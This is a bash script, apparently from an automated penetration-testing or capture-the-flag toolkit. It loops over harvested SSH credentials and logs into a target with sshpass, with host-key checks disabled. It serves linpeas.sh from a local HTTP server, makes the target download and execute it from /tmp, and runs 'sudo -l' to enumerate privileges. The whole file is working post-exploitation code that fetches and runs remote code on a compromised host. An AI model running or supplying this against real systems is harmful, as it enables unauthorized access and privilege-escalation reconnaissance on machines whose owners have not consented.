#!/bin/bash
path=$(cat path)
cd $path
IP_address=$(cat IP_address)
port=$(cat port)
IP_local=$(cat IP_local)
connect=$(cat ssh_users)
IFS=$'\n' read -rd '' -a user_connect <<< $connect
for usr in ${user_connect[@]}
do
	#Get password before moving in an other directory
	passwd=$(cat password_$usr)
	working_directory=$(pwd)
	#Create a web server on local machine to upload linpeas.sh on the target
	cd ..
	cd ..
	cd Tools
	python3 -m http.server $port &
	pid=$(echo $!)
	echo -e "\n Uploading linpeas.sh to the target"
	sshpass -p $passwd ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null $usr@$IP_address "cd /tmp; wget http://$IP_local:$port/linpeas.sh; chmod +x linpeas.sh; ./linpeas.sh" > linpeas_$usr
	kill -15 $pid
	local_directory=$(pwd)
	mv $local_directory/linpeas_$usr $working_directory
	cd $working_directory
	sshpass -p $passwd ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null $usr@$IP_address "sudo -l" > sudo_command_$usr
done
